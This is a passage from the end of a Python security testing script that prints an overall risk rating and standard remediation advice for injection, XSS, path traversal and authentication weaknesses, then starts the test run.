            print("   🛠️ SECURITY FIXES REQUIRED BEFORE PRODUCTION")
        else:
            print("   🔥 HIGH SECURITY RISK - Application has critical security vulnerabilities!")
            print("   ❌ Multiple critical vulnerabilities detected")
            print("   ❌ Input sanitization and validation failing")
            print("   🚨 IMMEDIATE SECURITY FIXES REQUIRED - DO NOT DEPLOY TO PRODUCTION")
        
        # Recommendations
        print(f"\n💡 SECURITY RECOMMENDATIONS:")
        if len(critical_vulns) > 0:
            print("   🔥 CRITICAL: Fix all critical vulnerabilities immediately")
        if len(high_vulns) > 0:
            print("   ⚠️ HIGH: Address high-priority security issues")
        
        if sql_tests and sql_secure < len(sql_tests):
            print("   🛡️ Implement proper SQL injection protection (parameterized queries)")
        if xss_tests and xss_secure < len(xss_tests):
            print("   🛡️ Implement XSS protection (input sanitization, output encoding)")
        if nosql_tests and nosql_secure < len(nosql_tests):
            print("   🛡️ Implement NoSQL injection protection (input validation)")
        if command_tests and command_secure < len(command_tests):
            print("   🛡️ Implement command injection protection (input sanitization)")
        if path_tests and path_secure < len(path_tests):
            print("   🛡️ Implement path traversal protection (path validation)")
        if auth_tests and auth_secure < len(auth_tests):
            print("   🛡️ Strengthen authentication and authorization controls")
        
        print("=" * 80)

if __name__ == "__main__":
    tester = SecurityVulnerabilityTester()
    tester.run_comprehensive_security_tests()